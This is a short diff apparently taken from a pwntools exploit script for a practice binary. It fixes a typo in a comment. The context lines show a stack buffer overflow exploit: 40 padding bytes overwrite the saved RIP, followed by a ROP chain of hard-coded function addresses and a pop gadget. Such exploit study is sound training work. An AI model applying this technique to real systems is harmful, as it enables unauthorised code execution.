@@ -55,7 +55,7 @@ io = start()
 msg = io.recvuntil("> ")
 print(msg)
 # Build the input vector as 40 arbitrary bytes plus the ROP chain,
-# that will overwrithe the saved RIP.
+# that will overwrite the saved RIP.
 vector = "B" * 40
 for funaddr in [0x401850, 0x401870, 0x401810]:
     # The address of the triple-pop gadget.
